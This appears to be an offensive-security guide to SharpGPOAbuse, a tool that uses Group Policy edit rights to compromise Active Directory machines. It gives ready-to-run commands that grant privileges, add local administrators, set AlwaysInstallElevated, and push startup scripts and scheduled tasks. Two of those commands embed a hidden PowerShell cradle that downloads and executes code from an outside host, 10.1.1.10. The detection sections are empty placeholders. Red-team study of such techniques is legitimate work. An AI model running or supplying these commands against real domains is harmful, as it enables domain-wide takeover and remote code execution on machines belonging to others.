# SharpGPOAbuse
## Summary

SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. The original project hasn't been maintained in a couple of years, but [this fork](https://github.com/NukingDragons/SharpGPOAbuse) extends the functionality. The "Vulnerable GPO" is simply the GPO that you wish to target, this can even be the default domain controller GPO that is automatically created on every DC.

## Prerequisites

In order to abuse GPO's, a configured Active Directory domain must be completely set up, and you must have access to a user that has privileges to modify GPO's. In order to modify a GPO, this utility relies on LDAP and SMB as well. This binary is also a PE executable, it expects to be ran on a Windows machine that's already been joined to the target domain controller.

## Setup

Download the [current release executable](https://github.com/NukingDragons/SharpGPOAbuse/releases), and either reflectively load or upload to a domain-joined Windows machine that you have access to.

## Execution

### Method 1 - AddUserRights

The following are the available options to add rights to a user account via GPO:

```
Options required to add new user rights:
--UserRights
        Set the new rights to add to a user. This option is case sensitive and a comma separeted list must be used.
--UserAccount
        Set the account to add the new rights.
--GPOName
        The name of the vulnerable GPO.
```

This command will add the "SeTakeOwnership" and "SeRemoteInteractiveLogonRight" privileges to the bob.smith user account. 

```
SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
```

#### Indicators of Compromise

TODO

### Method 2 - AddLocalAdmin

The following are the available options to add a local admin via GPO:

```
Options required to add a new local admin:
--UserAccount
        Set the name of the account to be added in local admins.
--GPOName
        The name of the vulnerable GPO.
```

The following will create a new local administrator account named "bob.smith":

```
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
```

#### Indicators of Compromise

TODO

### Method 3 - AddUserScript / AddComputerScript

The following are the available options to add a user or computer script via GPO:

```
Options required to add a new user or computer startup script:
--ScriptName
        Set the name of the new startup script.
--ScriptContents
        Set the contents of the new startup script.
--GPOName
        The name of the vulnerable GPO.
```

The following will add a user script, this syntax also works with "--AddComputerScript":

```
SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
```

#### Indicators of Compromise

TODO

### Method 4 - AddUserTask / AddComputerTask

The following are the available options to add a user or computer task via GPO:

```
Options required to add a new computer or user immediate task:

--TaskName
        Set the name of the new computer task.
--Author
        Set the author of the new task (use a DA account).
--Command
        Command to execute.
--Arguments
        Arguments passed to the command.
--GPOName
        The name of the vulnerable GPO.

Additional User Task Options:
--FilterEnabled
        Enable Target Filtering for user immediate tasks.
--TargetUsername
        The user to target. The malicious task will run only on the specified user. Should be in the format <DOMAIN>\<USERNAME>
--TargetUserSID
        The targeted user's SID.

Additional Computer Task Options:
--FilterEnabled
        Enable Target Filtering for computer immediate tasks.
--TargetDnsName
        The DNS name of the computer to target. The malicious task will run only on the specified host.
```

The following will add a user task, this syntax also works with "--AddComputerTask":

```
SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
```

#### Indicators of Compromise

TODO

### Method 5 - AddRegistryKey

The following are the available options to add a registry key via GPO:

```
Options required to set a registry key:
--KeyPath
        The path to the registry key.
--KeyName
        The name of the registry key.
--KeyType
        The type of data to place into the registry key.
--KeyData
        The data to place into the registry key.
--Hive
        The registry hive to affect, can be HKLM or HCU.
--GPOName
        The name of the vulnerable GPO.
```

Currently, only the REG_DWORD key is supported with this tool. Due to restrictions on the GPO, only HKLM and HCU are available as hives.

The following will add a registry key:

```
SharpGPOAbuse.exe --AddRegistryKey --Hive HKLM --KeyPath "Software\Policies\Microsoft\Windows\Installer" --KeyName AlwaysInstallElevated --KeyType REG_DWORD --KeyData 1 --GPOName "Vulnerable GPO"
```

#### Indicators of Compromise

TODO